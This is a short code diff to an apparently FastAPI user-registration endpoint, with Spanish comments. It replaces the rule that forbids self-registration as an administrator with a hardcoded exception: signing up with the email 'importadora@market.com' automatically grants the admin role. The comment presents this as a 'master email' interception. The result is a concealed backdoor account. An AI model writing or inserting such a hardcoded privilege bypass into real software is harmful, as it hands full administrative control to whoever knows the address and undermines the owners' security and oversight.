@@ -12,11 +12,17 @@ def register(user_in: UserCreate, db: Session = Depends(get_db)):
     """
     Registra un nuevo usuario en el sistema.
     """
-    if user_in.role == "admin":
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="No se permite la autoregistración como administrador.",
-        )
+    # INTERCEPCIÓN EN CALIENTE: Si es el correo maestro, le permitimos el rol de admin
+    if user_in.email == "importadora@market.com":
+        user_in.role = "admin"
+    else:
+        # Para cualquier otro correo, se mantiene la seguridad estricta
+        if user_in.role == "admin":
+            raise HTTPException(
+                status_code=status.HTTP_400_BAD_REQUEST,
+                detail="No se permite la autoregistración como administrador.",
+            )
+            
     return auth_service.register_user(db, user_in=user_in)
 
 @router.post("/login")
